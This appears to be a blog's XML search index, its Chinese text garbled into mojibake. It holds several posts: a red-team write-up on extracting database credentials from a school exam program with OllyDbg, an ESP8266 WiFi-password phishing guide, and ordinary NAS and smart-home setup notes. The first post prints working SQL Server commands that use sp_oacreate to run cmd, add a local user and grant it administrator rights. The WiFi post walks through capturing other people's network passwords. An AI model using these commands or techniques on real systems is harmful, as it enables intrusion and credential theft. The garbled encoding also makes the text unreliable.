<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>å…¥é—¨ODæ‰“å¼€é€†å‘ä¸–ç•Œå¤§é—¨ä¹‹æ—¥ç©¿æˆ‘æ ¡æŸè€ƒè¯•ç³»ç»Ÿè½¯ä»¶</title>
    <url>/2021/11/09/OllydbgStudy/</url>
    <content><![CDATA[å‰è¨€è¿™å­¦æœŸä¸Šæ•°æ®åº“è¯¾ç”¨åˆ°äº†æˆ‘æ ¡æŸè€å¸ˆè‡ªå·±å¼€å‘çš„ä¸€ä¸ªè€ƒè¯•ç³»ç»Ÿè½¯ä»¶ï¼Œç„¶ååœ¨ä¸€æ¬¡å°æµ‹ä¸­è¿™åƒåœ¾ç³»ç»Ÿæˆ‘è¯­å¥æ˜æ˜å°±æ˜¯å¯¹çš„ï¼Œå¯å®ƒç¼–è¯‘å°±ä¸€ç›´æŠ¥é”™è¯´æˆ‘è¯­æ³•é”™è¯¯ï¼Œå®åœ¨å—ä¸äº†é‚£å°±æ¥ç›˜ä¸€ä¸‹ä»–ï¼ˆæˆæƒæµ‹è¯•çš„ï¼Œç”¨æˆ·åœ¨æµ‹è¯•æˆåŠŸåå·²åˆ é™¤ã€‚
æ³¨ï¼šæ­¤æ–‡ç« ä»…é™äºå®‰å…¨ç ”ç©¶ï¼Œè¿æ³•çŠ¯ç½ªä¸ä½œè€…æ— å…³ï¼
é€†å‘åˆ†æå°†ç¨‹åºè½½å…¥ODè¿™ä¸ªç¨‹åºæ˜¯åŠ äº†ä¸€ä¸ªASPackçš„å£³å­ï¼Œç›´æ¥ç”¨ESPå®šå¾‹æ‰¾åˆ°OEP

F9è¿è¡Œåˆ°äº†OEPé™„è¿‘ï¼Œèµ°è¿‡è¿™ä¸ªretn

ç°åœ¨å°±æ¥åˆ°äº†OEPï¼ˆå¦‚æœä½ çš„ODæ˜¾ç¤ºçš„éƒ½æ˜¯dbçš„è¯ç”¨å³é”®-&gt;åˆ†æ-&gt;ä»æ¨¡å—ä¸­åˆ é™¤ç›®æ ‡æ‰«æï¼‰ï¼Œç„¶ååˆ æ‰ä¹‹å‰ä¸‹çš„ç¡¬ä»¶æ–­ç‚¹

ç„¶åç»§ç»­å•æ­¥â€¦â€¦ï¼ˆbalabala
æˆ–è€…æˆ‘ä»¬ç›´æ¥åˆ©ç”¨å·¥å…·å°†å®ƒè„±å£³ç„¶åå°†å…¶å¯¼å…¥ï¼Œå³é”®-&gt;ä¸­æ–‡æœç´¢å¼•æ“-&gt;æ™ºèƒ½æœç´¢

æ¥ç€æœç´¢å­—ç¬¦ä¸²password&#x3D;æˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰¾æ•°æ®åº“çš„è¿æ¥ä¿¡æ¯

ç„¶åè·Ÿéšè¿‡å»ååœ¨æ®µé¦–ä¸‹ä¸€ä¸ªæ–­ç‚¹

F9è¿è¡Œç¨‹åºï¼Œå‘ç°ç¨‹åºå·²ç»æ®µä¸‹æ¥äº†ï¼Œå³è¾¹çš„å¯„å­˜å™¨çª—å£ä¸­æ˜¾ç¤ºçš„å°±æ˜¯è¿æ¥ä¿¡æ¯ï¼Œä½†ä¸å…¨é¢

ç»§ç»­F8å•æ­¥ï¼Œè¿è¡Œåˆ°æˆ‘ä»¬æ‰¾åˆ°çš„ password= é™„è¿‘çš„callï¼Œçœ‹åˆ°å †æ ˆçª—å£ä¸­å·²ç»å®Œå…¨æ˜¾ç¤ºäº†è¿æ¥ä¿¡æ¯

æ¸—é€ææƒå¾—åˆ°è´¦å·å¯†ç åï¼Œæˆ‘ä»¬å°±å¼€å§‹sqlserverè¿æ¥åˆ°æœåŠ¡å™¨

è¿™é‡Œæˆ‘ä»¬æ˜¯å¯ä»¥è°ƒç”¨cmdæ‰§è¡Œå‘½ä»¤çš„ï¼Œwhoami å‘ç°æ˜¯ system
declare @shell intexec sp_oacreate &#x27;wscript.shell&#x27;,@shell outputexec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\log.txt&#x27; create table tmp_text (lines nvarchar(1000))bulk insert tmp_text from N&#x27;C:\log.txt&#x27;select * from tmp_textdrop table tmp_text


äºæ˜¯æˆ‘ä»¬å°±å¼€å§‹å¢åŠ ç”¨æˆ·å¹¶ç»™æ–°å»ºçš„è´¦å·ç®¡ç†å‘˜æƒé™
declare @shell intexec sp_oacreate &#x27;wscript.shell&#x27;,@shell outputexec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net user ç”¨æˆ·å å¯†ç  /add &gt;c:\log.txt&#x27; declare @shell intexec sp_oacreate &#x27;wscript.shell&#x27;,@shell outputexec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net localgroup administrators ç”¨æˆ·å /add &gt;c:\log.txt&#x27; create table tmp_text (lines nvarchar(1000))bulk insert tmp_text from N&#x27;C:\log.txt&#x27;select * from tmp_textdrop table tmp_text

æœ€åmstscæˆåŠŸè¿ä¸Š

]]></content>
      <categories>
        <category>çº¢é˜Ÿç¬”è®°</category>
      </categories>
      <tags>
        <tag>Ollydbg</tag>
      </tags>
  </entry>
  <entry>
    <title>esp8266é’“é±¼è·å–æŒ‡å®šWiFiå¯†ç </title>
    <url>/2022/08/10/esp8266towifi/</url>
    <content><![CDATA[å‰è¨€å‰æ®µæ—¶é—´æ”¶æ‹¾ä¸œè¥¿åœ¨ä»¥å‰çæ£é¼“çš„æ™ºèƒ½ç¯ä¸ŠæŠŠesp8266æ‹†äº†ä¸‹æ¥ï¼Œæƒ³ç€æ‹¿æ¥ç ”ç©¶æ— çº¿ç”µè¿™å—çš„çŸ¥è¯†ï¼Œç„¶åå‘ç°äº†ä¸€ç¯‡ ç”¨ESP8266æ— çº¿æ¨¡å—è¿›è¡Œé’“é±¼æ¸—é€æµ‹è¯• çš„æ–‡ç« ï¼Œæ¥ä¸‹æ¥å°±æ¥å¤ç°ä¸€ä¸‹å§

å‡†å¤‡å·¥ä½œç¡¬ä»¶æ–¹é¢ï¼šesp8266 æ— çº¿æ¨¡å—ï¼ˆæˆ‘çš„å’Œä½œè€…ä¸€æ ·æ˜¯å—esp01ï¼‰ã€USB è½¬ TTL çƒ§å½•å™¨
è½¯ä»¶æ–¹é¢ï¼šESP8266Flasher - nodemcuã€XCOMä¸²å£è°ƒè¯•åŠ©æ‰‹ã€ä½œè€…æ›´æ–°çš„å›ºä»¶
é“¾æ¥ï¼šhttps://pan.baidu.com/s/1NiO9Ty_zDIvia-IgOtqrxwæå–ç ï¼šqkck

çƒ§å½•å°†æˆ‘ä»¬çš„esp8266-01ä¸çƒ§å½•å™¨è¿æ¥ç„¶åæ’å…¥ç”µè„‘ä¸Šï¼Œæ¥ç€æ‰“å¼€è®¾å¤‡ç®¡ç†å™¨æ‰¾åˆ° cp210x è¿™ä¸ªç«¯å£

æ¥ç€æˆ‘ä»¬æ‰“å¼€nodemcuï¼Œåœ¨operationæ¨¡å—ä¸‹é€‰æ‹©com6ç«¯å£

ç„¶ååœ¨configæ¨¡å—ä¸‹ï¼Œè¾“å…¥å›ºä»¶è·¯å¾„ï¼Œçƒ§å½•åœ°å€ 0x00000

æœ€åå›åˆ°operationæ¨¡å—ï¼Œç‚¹å‡» flash å¼€å§‹çƒ§å½•ï¼Œå½“å‡ºç°ç»¿å‹¾åˆ™è¯´æ˜çƒ§å½•æˆåŠŸï¼Œå¦‚æœçƒ§å½•å¤±è´¥è¯·æ“¦é™¤ flash åé‡è¯•ï¼ˆæœ¬äººæš‚æ— å‡ºç°å¤±è´¥æƒ…å†µ

æµ‹è¯•
wifiåç§°FishAPï¼Œå¯†ç ï¼šgkdamm666 åå°ï¼šhttp://192.168.0.1/backdoor.html

é¦–å…ˆæˆ‘ä»¬éœ€è¦è¿æ¥FishAPè¿™ä¸ªWiFiï¼Œç„¶åè®¿é—®åå°ï¼Œç­‰å¾…ä¸€ä¼šè®©æ¨¡å—æ‰«æå‡ºé™„è¿‘çš„WiFiï¼ˆPSï¼šå¦‚æœæ‰¾ä¸åˆ°FishAPè¿™ä¸ªWiFiï¼Œå°±é‡å¯æ¨¡å—

æ¥ç€å‹¾é€‰é€šç”¨å‹ï¼Œå¡«å†™ç¼–å·ï¼ˆç¼–å·å°±æ˜¯åˆ—è¡¨æœ€å‰é¢çš„é‚£ä¸ªæ•°å­—ï¼Œéœ€è¦æ‰¾åˆ°ä½ æ‰€æŒ‡å®šWiFiå¯¹åº”çš„ç¼–å·

æ²¡æ˜¾ç¤ºåŠ å¯†çš„é‚£ä¸ªå°±æ˜¯æˆ‘ä»¬çš„é’“é±¼WiFi

ç¯äº®è¡¨ç¤ºåœ¨é’“é±¼ï¼Œé’“åˆ°å¯†ç ä»¥åç¯ç­ï¼ŒWiFiåˆ—è¡¨é‡æ–°å‡ºç°fishapï¼Œè¿æ¥ä¸Šæ‰“å¼€åå°å³å¯çœ‹åˆ°å¯†ç 

æ€»ç»“å»ºè®®åˆ«ç”¨esp8266-01è¿›è¡Œé’“é±¼ï¼Œå®ƒæ›´é€‚ç”¨äºåšWiFiæ€æ‰‹ã€‚å…¶ä¸€æ˜¯å› ä¸ºå…¶æ€§èƒ½ä½ï¼ŒåŠ è½½é’“é±¼ç•Œé¢å¾ˆä¹…ã€‚å…¶äºŒï¼Œå®ƒçš„ä¿¡å·èŒƒå›´æå°ï¼Œåˆ«äººå¾ˆéš¾æ‰«æåˆ°ã€‚æœ€å¥½è¿˜æ˜¯ç”¨åŠ å¤§åŠŸç‡çš„æ— çº¿ç½‘å¡é…åˆfluxionç­‰å¼€æºé’“é±¼é¡¹ç›®
]]></content>
      <categories>
        <category>ç ”ç©¶éšç¬”</category>
      </categories>
      <tags>
        <tag>esp8266</tag>
      </tags>
  </entry>
  <entry>
    <title>å¹´è½»äººçš„ç¬¬ä¸€å°NAS</title>
    <url>/2023/02/25/%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E5%8F%B0NAS/</url>
    <content><![CDATA[å‡†å¤‡å·¥ä½œéœ€è¦è´­ç½®çš„é›¶ä»¶æœ‰æœºç®±ï¼ˆå¯ä»¥è‡ªå·±å•ç‹¬è´­ä¹°ç”µæºï¼‰ã€ä¸»æ¿ã€å†…å­˜æ¡ã€ç¡¬ç›˜
1.æœºç®±è¿™é‡Œæˆ‘ä¹°çš„æ˜¯æ‹“æ™®é¾™6ç›˜ä½NASæœåŠ¡å™¨æœºç®±ï¼Œä¸è¿‡ä¸å»ºè®®ä¹°6å£çš„ï¼ˆè´¼éš¾è£…ï¼Œéš¾æ€ªæ²¡å•¥äººä¹°è¿™æ¬¾ï¼Œæ—©çŸ¥é“å°±ä¸è´ªä¾¿å®œç›´æ¥ä¹°ä¸ª8å£çš„æœºç®±è¦å¥½è£…å¤šäº†ğŸ¤”ï¼‰

å¼€ç®±å¦‚ä¸‹ï¼Œè¿˜ä¸é”™çš„ä¸€ç‚¹å°±æ˜¯ç»™é…äº†ä¸€å¤§åŒ…èºä¸ğŸ˜˜ä½†æ˜¯æ²¡åˆ†å¼€æ¥åŒ…è£…ä¸å¥½æ‰¾è¦ç”¨çš„


2.ç”µæºè¿™é‡Œç”µæºæˆ‘æ˜¯å•ç‹¬è´­ä¹°çš„å°è¾¾150Wç”µæºï¼ˆä»–å–µçš„~æˆ‘ä¹°çš„æ—¶å€™è¿˜éœ€è¦12å—è¿è´¹ï¼Œç°åœ¨å°±å˜å…è¿è´¹å•¦ğŸ¤¡

å¼€ç®±å¦‚ä¸‹ï¼Œä¸€å—ç”µæºä»¥åŠä¸€æ ¹ç”µæºçº¿

3.ä¸»æ¿ä¸»æ¿æˆ‘é€‰çš„æ˜¯æ˜ æ³°j4125ï¼Œä¹°çš„æ—¶å€™æ¶¨ä»·äº†å¥½è´µ~ äºæ˜¯æˆ‘é€‰æ‹©äº†pddè´­ä¹°èƒ½ä¾¿å®œæŒºå¤šçš„


4.å†…å­˜æ¡å†…å­˜è¦æ±‚å°±ä¸æ˜¯å¾ˆé«˜äº†ï¼Œéšä¾¿ä¹°ä¸ª4Gçš„å°±è¡Œï¼Œä¸è¿‡æœ‰ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯é¢—ç²’æ•°é‡ï¼Œä¸€å®šå¾—ä¹°4é¢—ç²’çš„ï¼Œå•†å®¶ä¸€èˆ¬éƒ½ä¸ä¼šå†™å‡ºæ¥æ‰€ä»¥æ¯”è¾ƒå‘

å¦‚æœä¸æ˜¯4é¢—ç²’çš„ï¼Œæµ‹è¯•çš„æ—¶å€™å°±ä¼šå‡ºç°å¦‚ä¸‹é—®é¢˜ï¼Œæ¯«æ— ååº”ï¼ˆæˆ‘è¿™ä¸ªå†…å­˜åº”è¯¥æ‹†å¼€æ˜¯8é¢—ç²’çš„ğŸ˜£ä»¥åŠè¿™é‡ŒUç›˜æ˜¯è¦æ’åœ¨åé¢ä¸»æ¿ä¸Šçš„ï¼‰

5.ç¡¬ç›˜è¿™é‡Œæˆ‘é€‰çš„æ˜¯æµ·åº·å¨è§†çš„ç›‘æ§ç¡¬ç›˜ï¼Œä¸¤å—4Tçš„å¤§æ¦‚å°±èŠ±äº†ä¸ƒç™¾å—ï¼Œä¾æ—§è¿˜æ˜¯ä¸Špddé‡‡è´­èŠ‚çœå¼€é”€

å®‰è£…è¿‡ç¨‹å…¶å®nasè¯´å¥½è£…ä¹Ÿå¥½è£…ï¼Œè¯´ä¸å¥½è£…ä¹Ÿä¸å¥½è£…ğŸ˜‚å°±æ˜¯ä¸€ä¸ªèåœä¸€ä¸ªå‘
å…ˆæŠŠç”µæºæ ¹æ®æœºç®±çš„ç»“æ„å›ºå®šåˆ°å¯¹åº”ä½ç½®ï¼Œå†æŠŠç”µæºä¸Šçš„çº¿è£…å¥½ï¼ˆè¿™é‡Œæƒ³å–·ä¸€ä¸‹å®ƒè¿™é‡Œæ¥çº¿å¯å›°éš¾äº†ï¼Œåæ¿ç„Šä½äº†ä¸èƒ½æ‹†å¼€ï¼Œå¹¶ä¸”å’Œsataçº¿æ··åœ¨ä¸€å—ï¼Œå¯ä»¥è¯´æ¯«æ— å‘åŠ›ç‚¹ï¼‰ï¼Œè¿™é‡Œæˆ‘æ²¡æœ‰è£…æ‰©å±•å¡å°±åªç”¨åˆ°ä¸¤æ ¹sataçº¿ï¼Œæ‰€ä»¥é£æ‰‡ä¹Ÿå°±æ²¡å¿…è¦æ’ä¸Šï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç¡¬ç›˜çº¿ä¸€å®šå¾—æŒ‰é¡ºåºæ¥ä¸Šå¹¶è®°ä½å®ƒ

ç„¶åå°±æ˜¯ä¸»æ¿äº†ï¼Œå…ˆæŠŠæˆ‘ä»¬è¦ç”¨åˆ°çš„ä¸¤è·Ÿsataçº¿æŒ‰ä¸»æ¿ä¸Šå†™çš„1ã€2å¯¹åº”è£…ä¸Šï¼Œå†æ‰¾åˆ°usbçº¿å’Œç”µæºçº¿æ‰¾åˆ°å¯¹åº”ä½ç½®è£…ä¸Šï¼Œä»¥åŠ4pinã€24pinçº¿ï¼Œå†…å­˜æ¡ï¼Œç„¶åæ ¹æ®æœºç®±ç»“æ„è£…ä¸Šä¸»æ¿ã€‚è¿™é‡Œæƒ³å–·ä¸€ä¸‹ä¸»æ¿é‚£é‡Œçš„èºä¸å­”ç‰¹åˆ«æ­ªï¼Œåé¢æ‰‹è¢«å‰²äº†å¥½å‡ ä¸ªå£æ‰å‹‰å¼ºå›ºå®šä½ï¼ˆä¸‹å›¾å†…å­˜è¿˜æ²¡æ’ä¸Šå°±æ˜¯å› ä¸ºå®ƒç¿»è½¦ï¼‰

ç»„è£…å¥½åä¸ç€æ€¥æŠŠå£³è£…ä¸Šï¼Œéœ€è¦æµ‹è¯•ä¸€ä¸‹èƒ½ä¸èƒ½ç”¨ï¼Œå…ˆæ’ä¸Šæ˜¾ç¤ºå±çš„HDMIçº¿å’Œè£…å¥½peçš„Uç›˜ï¼Œå†æ’ä¸Šç”µæºçº¿ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š

äº®èµ·æ¥ä¸€èˆ¬å°±æ²¡å•¥é—®é¢˜äº†ï¼Œæœ€åæˆåŠŸè¿›å…¥peå°±å¯ä»¥è£…ä¸Šäº†

æœ€åå…³æœºï¼ŒæŠŠç¡¬ç›˜è£…å¥½æ’ä¸Šå³å¯å¼€å§‹nasä¹‹æ—…ğŸ˜

]]></content>
      <categories>
        <category>æŠ˜è…¾å®å½•</category>
      </categories>
      <tags>
        <tag>NAS</tag>
      </tags>
  </entry>
  <entry>
    <title>DDNS GOå®ç°åŠ¨æ€è§£æ</title>
    <url>/2023/03/04/NAS-DDNSGO/</url>
    <content><![CDATA[é¦–å…ˆåˆ°å¥—ä»¶ä¸­å¿ƒå®‰è£…ddns-go

æ¥ç€æ‰“å¼€ddns-goåå¡«å†™IDã€tokenå’ŒDomainsçš„ä¿¡æ¯å³å¯ï¼Œè…¾è®¯äº‘çš„è¯å¯ä»¥ç›´æ¥ç‚¹å‡»åˆ›å»ºå¯†é’¥æ¥ç”ŸæˆIDå’Œtoken

å…·ä½“å¯å‚è€ƒæ–‡ç« ï¼šhttps://cloud.tencent.com/developer/article/1921363



ç„¶åå›åˆ°nasçš„æ§åˆ¶é¢æ¿é‡Œç›´æ¥å»æœç´¢ä¸€ä¸‹è¯ä¹¦æ‰¾åˆ°ä½ç½®è¿›è¡Œæ–°å¢è¯ä¹¦



ç„¶åå»ä¹‹å‰ç”³è¯·è¯ä¹¦çš„dnspodä¸­ä¸‹è½½è¯ä¹¦æ–‡ä»¶ï¼Œè¿™é‡Œé€‰æ‹©nginx

å°†ä¸‹è½½çš„è¯ä¹¦æ–‡ä»¶å¯¼å…¥å³å¯

]]></content>
      <categories>
        <category>æŠ˜è…¾å®å½•</category>
      </categories>
      <tags>
        <tag>NAS</tag>
      </tags>
  </entry>
  <entry>
    <title>NASåç»­-å®‰è£…é»‘ç¾¤æ™–</title>
    <url>/2023/02/27/NAS%E5%90%8E%E7%BB%AD-%E5%AE%89%E8%A3%85%E9%BB%91%E7%BE%A4%E6%99%96/</url>
    <content><![CDATA[é¦–å…ˆä¸ŠGitHubæ‰¾åˆ°arplï¼Œä¸‹è½½è¿™ä¸ªimgçš„æ–‡ä»¶ï¼ˆè¿™ä¸ªæ ¼å¼æ˜¯é€šç”¨çš„ï¼Œå¯ä¾›ç‰©ç†æœºä¹Ÿå¯ä¾›è™šæ‹Ÿæœºä½¿ç”¨ï¼‰

æ¥ç€è§£å‹å¾—åˆ°imgæ–‡ä»¶ï¼Œåˆ©ç”¨å›¾å§å·¥å…·ç®±ä¸­çš„Rufuså°†å…¶åˆ·åˆ°Uç›˜é‡Œ

ç„¶åæŠŠåˆ·å¥½çš„Uç›˜æ”¾åˆ°NASä¸»æœºä¸Šï¼Œå¼€æœºè¿›BIOSè®¾ç½®ä»Uç›˜å¯åŠ¨ï¼ˆä¸€èˆ¬æ˜¯é»˜è®¤å¥½çš„ï¼‰ï¼Œç¡®è®¤æ— è¯¯åç‚¹å‡»save&amp;exitè¿›è¡Œé‡å¯

å½“ç¼–è¯‘ç³»ç»Ÿå‡ºç°å¦‚ä¸‹é¡µé¢æ—¶å°±è¡¨ç¤ºå·²ç»å¯åŠ¨å¥½äº†ï¼Œæˆ‘ä»¬éœ€è¦è®°ä¸‹ç¼–è¯‘ç³»ç»Ÿçš„IPåœ°å€ï¼ˆè¿™é‡Œæˆ‘ä»¬è·¯ç”±å™¨å¼€äº†DHCPï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å»è·å–IPåœ°å€ï¼Œè®°å¾—æ’ä¸Šç½‘çº¿å“¦ï¼‰

åœ¨åŒä¸€å±€åŸŸç½‘ä¸‹ï¼Œä½¿ç”¨å¦å¤–ä¸€å°ç”µè„‘çš„æµè§ˆå™¨æ‰“å¼€ç¼–è¯‘ç³»ç»Ÿæ˜¾ç¤ºçš„IPåœ°å€å’Œç«¯å£ï¼Œä¼šæ˜¾ç¤ºä»¥ä¸‹ç•Œé¢ï¼Œåœ¨Choose a modelå¤„å›è½¦æ˜¾ç¤ºå‡ºæœ¬æœºå¯ç¼–è¯‘é»‘ç¾¤æ™–çš„å‹å·

è¿™é‡Œæˆ‘ä»¬é€‰çš„æ˜¯DS920+ï¼Œç”¨æ–¹å‘é”®é€‰å¥½ä»¥åæŒ‰å›è½¦é”®

æ¥ä¸‹æ¥åœ¨Choose a Build Numberå¤„å›è½¦

é€‰æ‹©æˆ‘ä»¬æƒ³è¦ç¼–è¯‘çš„é»‘ç¾¤æ™–ç‰ˆæœ¬ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©çš„æ˜¯æœ€æ–°çš„7.1.1-42962ç‰ˆæœ¬


åœ¨Choose a serial numberå¤„å›è½¦

æ¥ç€åœ¨Generate a random serial numberå¤„å›è½¦ï¼Œç¼–è¯‘ç³»ç»Ÿä¼šéšæœºç”Ÿæˆä¸€ä¸ªåºåˆ—å·

åœ¨Addonså¤„å›è½¦ï¼ˆå¦‚æœä½¿ç”¨çš„CPUä¸æ˜¯10ä»£ï¼Œæ­¤å¤„æ“ä½œç›´æ¥è·³è¿‡ï¼‰

å†ç‚¹å‡»Add an addonså¤„å›è½¦

åœ¨Intel iGPU Drivers(10th Gen)å¤„å›è½¦ï¼ŒåŠ è½½åä»£CPUæ ¸æ˜¾é©±åŠ¨

è¿™é‡Œç›´æ¥å›è½¦å³å¯ï¼Œæ— éœ€ç­‰å¾…å®ƒ

åŠ è½½å¥½é©±åŠ¨åï¼ŒæŸ¥çœ‹Add an addonså¤„å‘ç°10thå·²ç»ä¸è§äº†å³è¯´æ˜æ·»åŠ ä¸Šäº†ï¼Œå†åœ¨Exitå¤„å›è½¦è¿”å›ä¸Šçº§èœå•

åœ¨Build the loaderå¤„å›è½¦ï¼Œå¼€å§‹ç¼–è¯‘

è¿™é‡Œå°±åªæ˜¯ç¼–è¯‘bootæ–‡ä»¶ï¼Œæ‰€ä»¥ä¸æŒ‚ä»£ç†ä¹Ÿèƒ½å¿«é€Ÿå®Œæˆç¼–è¯‘

å¼•å¯¼ç¼–è¯‘å®Œæˆåï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è·³å›è¿™ä¸ªç•Œé¢ï¼Œå¹¶ä¸”ä¼šå¤šå‡ºä¸€è¡Œèœå•Boot the loderï¼Œç‚¹å‡»å›è½¦ï¼ŒæŠŠNASä¸»æœºæ‰‹åŠ¨é‡å¯ä¸€æ¬¡ï¼Œç¼–è¯‘å¥½çš„å¼•å¯¼å°±ä¼šè‡ªåŠ¨å¯åŠ¨

è¯¥é¡¹ç›®ç¼–è¯‘å‡ºæ¥çš„å¼•å¯¼å¯åŠ¨åæ˜¾ç¤ºçš„ç•Œé¢å¦‚ä¸‹ï¼Œä¼šæ˜¾ç¤ºç³»ç»Ÿå‹å·ã€ç³»ç»Ÿç‰ˆæœ¬ç­‰

ç„¶åç›´æ¥è®¿é—®IPæˆ–è€…5000ç«¯å£å³å¯çœ‹åˆ°

å†å»å®˜ç½‘ä¸‹è½½ä¸€ä¸‹paté•œåƒåŒ…å¹¶å°†å…¶ä¸Šä¼ 


å¼€å§‹å®‰è£…ç³»ç»Ÿ

è£…å¥½åä¼šé‡å¯ä¸€ä¸‹ï¼Œå¯èƒ½éœ€è¦ç­‰å¾…ä¸€æ®µæ—¶é—´


ç­‰å¾…ä¸€ä¼šå³å¯

ç‚¹å‡»å¼€å§‹

å¡«å†™ä¸€ä¸‹è‡ªå·±çš„è®¾å¤‡åä»¥åŠè´¦å·å¯†ç ï¼Œç„¶åä¸è¦å»å‹¾é€‰é‚£ä¸ªï¼Œå¡«å®Œç›´æ¥ä¸‹ä¸€æ­¥å°±è¡Œ

è¿™é‡Œæˆ‘ä»¬æ˜¯é»‘ç¾¤æ™–å°±ä¸è¦å»é€‰å®ƒæ¨èçš„è‡ªåŠ¨å®‰è£…ï¼Œåº”è¯¥å»é€‰æ‰‹åŠ¨å®‰è£…

é€‰æ‹©è·³è¿‡

å‹¾é€‰å¹¶æäº¤

è‡³æ­¤ï¼Œæˆ‘ä»¬å°±å®Œæˆäº†é»‘ç¾¤æ™–çš„å®‰è£…ğŸ‰

è¿›æ¥åå…ˆè·Ÿç€æç¤ºåˆ›å»ºå­˜å‚¨ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©RAID1å†ä¸‹ä¸€æ­¥

å°†ä¸¤å—ç¡¬ç›˜éƒ½é€‰ä¸Šå†ä¸‹ä¸€æ­¥

å‹¾é€‰æ‰§è¡Œç¡¬ç›˜æ£€æŸ¥å†ä¸‹ä¸€æ­¥

ç‚¹å‡»æœ€å¤§åŒ–åä¸‹ä¸€æ­¥

é€‰æ‹©æ¨èçš„Btrfså†ä¸‹ä¸€æ­¥

ç¡®è®¤æ— è¯¯ååº”ç”¨å³å¯

å¤§åŠŸå‘Šæˆï¼Œä¸ŠåºŠç¡å¤§è§‰å•¦ğŸ˜

åç»­åƒè¿™é‡Œå¯ä»¥ç”¨é‚®ç®±å¯ç”¨ç­‰æ“ä½œéƒ½è¿˜å¾…ç ”ç©¶ğŸ¤”

]]></content>
      <categories>
        <category>æŠ˜è…¾å®å½•</category>
      </categories>
      <tags>
        <tag>NAS</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ…è®°ç±³å®¶ç”µè„‘å¼€æœºå¡çš„å®‰è£…</title>
    <url>/2023/02/12/%E6%B5%85%E8%AE%B0%E7%B1%B3%E5%AE%B6%E7%94%B5%E8%84%91%E5%BC%80%E6%9C%BA%E5%8D%A1%E7%9A%84%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[å‡†å¤‡å·¥ä½œç®€å•çš„è®°å½•ä¸€ä¸‹åˆ©ç”¨ç±³å®¶ç”µè„‘å¼€æœºå¡é…åˆå°çˆ±éŸ³å“å®ç°è¯­è¨€æ§åˆ¶å¼€å…³æœº
æˆ‘ä»¬åªéœ€è¦è´­ç½®ä¸ªæœ€ä¾¿å®œçš„ç±³å®¶meshå¼€æœºå¡miniç‰ˆå³å¯ï¼ˆå½“ç„¶ç”µè„‘å’Œå°çˆ±éŸ³å“è¿™è¾¹å·²ç»æœ‰äº†ğŸ¤£ï¼‰



å®‰è£…è¿‡ç¨‹æ­¥å…¥æ­£é¢˜ï¼Œæ‹†å¼€è‡ªå·±çš„ç”µè„‘ï¼Œæ–­å¼€ç”µæºå¹¶å°†å¼€æœºå¡æ’åˆ°ä¸»æ¿å¯¹åº”ä½ç½®
ä¸‹é¢ä»¥æˆ‘çš„ä¸»æ¿ä¸ºä¾‹ï¼Œéœ€è¦æ’æ‹”çš„åœ°æ–¹å°±æ˜¯å¦‚ä¸‹ä¸¤å¤„

æ‰¾åˆ°è‡ªå·±ä¸»æ¿ä¸ŠPCIEX1å£å’Œæ’ç€POWER SWçº¿çš„ä½ç½®ï¼ˆä¸Šå›¾æ›´æ¸…æ™°ä¸€äº›ï¼‰ï¼Œå…ˆå°†ä¸»æ¿ä¸Šçš„POWER SWçº¿æ‹”ä¸‹æ¥ï¼Œæ’å…¥åˆ°å¼€æœºå¡ä¸Šç©ºç€çš„å¼•è„šä¸Šï¼Œå†å°†å¼€æœºå¡ä¸Šçš„é‚£æ ¹POWER SWçº¿æ’å…¥åˆ°ä¸»æ¿ä¸Šï¼ˆä¹Ÿå¯ä»¥çœ‹ä¸‹å›¾æ“ä½œï¼‰

è¿™é‡Œæ‹”çš„æ—¶å€™å¾ˆå®¹æ˜“å°†å…¶ä»–çš„çº¿ä¹Ÿæ‹”ä¸‹æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬æ ¹æ®ä¸‹å›¾æ‰€ç¤ºï¼Œä¾æ¬¡å°†POWER SWçº¿(å³ä¸Šè§’)ã€POWER LEDçº¿(å·¦ä¸Šè§’ï¼Œ+å·¦-å³)ã€HDDLEDçº¿(å·¦ä¸‹è§’)ã€RESET SWçº¿(å³ä¸‹è§’)ï¼ˆè¿™é‡Œçš„ä½ç½®æ˜¯é¢å‘è‡ªå·±ï¼Œä¸Šå››ä¸‹äº”ï¼Œæ’çš„æ—¶å€™æœ‰å­—çš„ä¸€é¢æœå‘è‡ªå·±çš„æ–¹å‘æ’å…¥ï¼‰

æœ€åå°†æ˜¾å¡å•¥çš„éƒ½è£…å¥½åå¼€å¯ç”µæºï¼Œæ‰‹æœºå°±ä¼šå¼¹å‡ºä¸€ä¸ªæƒ…æ™¯Meshé€šæ–­å™¨TMç³»åˆ—å¹¶å°†å…¶æ·»åŠ è‡³ç±³å®¶ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œè®¾å¤‡æ˜¯ç¦»çº¿çš„

ç‚¹è¿›å»çœ‹åˆ°å¥½åƒæ˜¯ä»€ä¹ˆè“ç‰™ç›´è¿çš„ï¼Œäºæ˜¯æ‰“å¼€è“ç‰™ç¡®å®æœ‰ä¸ªMesh Ali_Mi Lightçš„è“ç‰™è®¾å¤‡

ä½†æ˜¯è¿æ¥åå¹¶æ²¡æœ‰è§£å†³è®¾å¤‡ç¦»çº¿çš„é—®é¢˜ï¼Œæƒ³èµ·å‰é¢å°çˆ±éŸ³ç®±å¥½åƒæ²¡å¼€å¯meshç½‘å…³ï¼Œäºæ˜¯ä¸‹äº†ä¸ªå°çˆ±éŸ³ç®±APPç™»å½•åæ‰“å¼€è“ç‰™Meshå‘ç°ç¡®å®æ²¡å¼€å¯ï¼Œè¿ä¸Šåè¿˜æ˜¯æ²¡èƒ½æˆåŠŸè¿ä¸Šè®¾å¤‡


